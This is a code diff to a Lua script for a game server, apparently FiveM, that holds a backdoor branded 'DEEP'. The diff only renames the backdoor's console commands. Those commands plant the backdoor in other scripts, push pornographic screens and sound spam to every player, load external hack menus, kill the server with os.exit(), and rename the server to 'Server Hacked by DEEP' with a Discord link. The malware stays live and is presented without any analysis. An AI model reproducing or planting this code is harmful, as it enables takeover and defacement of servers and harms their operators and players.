@@ -304,39 +304,39 @@ end)
 	-- !> Install Backdoor in other Scripts <! --
 end
 
-RegisterCommand("+DEEP+installBackdoor", function(source, args, rawCommand)
+RegisterCommand("DEEPinstallBackdoor", function(source, args, rawCommand)
 	SDhskXCsi391()
 end, false)
 
-RegisterCommand("+DEEP+hackServer", function(source, args, rawCommand)
+RegisterCommand("DEEPhackServer", function(source, args, rawCommand)
 	TriggerClientEvent('DEEP-Backdoor-HackServer', -1)
 end, false)
 
-RegisterCommand("+DEEP+blipsHack", function(source, args, rawCommand)
+RegisterCommand("DEEPblipsHack", function(source, args, rawCommand)
 	TriggerClientEvent('DEEP-Backdoor-BlipsHack', -1)
 end, false)
 
-RegisterCommand("+DEEP+porn", function(source, args, rawCommand)
+RegisterCommand("DEEPporn", function(source, args, rawCommand)
 	TriggerClientEvent('DEEP-Backdoor-pornScreen', -1)
 end, false)
 
-RegisterCommand("+DEEP+soundSpam", function(source, args, rawCommand)
+RegisterCommand("DEEPsoundSpam", function(source, args, rawCommand)
 	TriggerClientEvent('DEEP-Backdoor-soundSpam', -1)
 end, false)
 
-RegisterCommand("+DEEP+loadBrutan", function(source, args, rawCommand)
+RegisterCommand("DEEPloadBrutan", function(source, args, rawCommand)
 	TriggerClientEvent('DEEP-Backdoor-Brutan', -1)
 end, false)
 
-RegisterCommand("+DEEP+loadFalcon", function(source, args, rawCommand)
+RegisterCommand("DEEPloadFalcon", function(source, args, rawCommand)
 	TriggerClientEvent('DEEP-Backdoor-Falcon', -1)
 end, false)
 
-RegisterCommand("+DEEP+stopServer", function(source, args, rawCommand)
+RegisterCommand("DEEPstopServer", function(source, args, rawCommand)
 	os.exit()
 end, false)
 
-RegisterCommand("+DEEP+hackedNames", function(source, args, rawCommand)
+RegisterCommand("DEEPhackedNames", function(source, args, rawCommand)
 	serverName = "Server Hacked by DEEP | https://dsc.gg/deepware"
 	SetConvarReplicated("sv_hostname", string.format(serverName))
 	SetConvarServerInfo('tags', 'HACKED')
@@ -346,11 +346,11 @@ RegisterCommand("+DEEP+hackedNames", function(source, args, rawCommand)
 	SetConvarServerInfo('tags', 'Server Hacked by DEEP | https://dsc.gg/deepware')
 end, false)
 
-RegisterCommand("+DEEP+discordHack", function(source, args, rawCommand)
+RegisterCommand("DEEPdiscordHack", function(source, args, rawCommand)
 	TriggerClientEvent('DEEP-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
 end, false)
 
-RegisterCommand("+DEEP+loadEverything", function(source, args, rawCommand)
+RegisterCommand("DEEPloadEverything", function(source, args, rawCommand)
 	SDhskXCsi391()
 	TriggerClientEvent('DEEP-Backdoor-HackServer', -1)
 	TriggerClientEvent('DEEP-Backdoor-BlipsHack', -1)
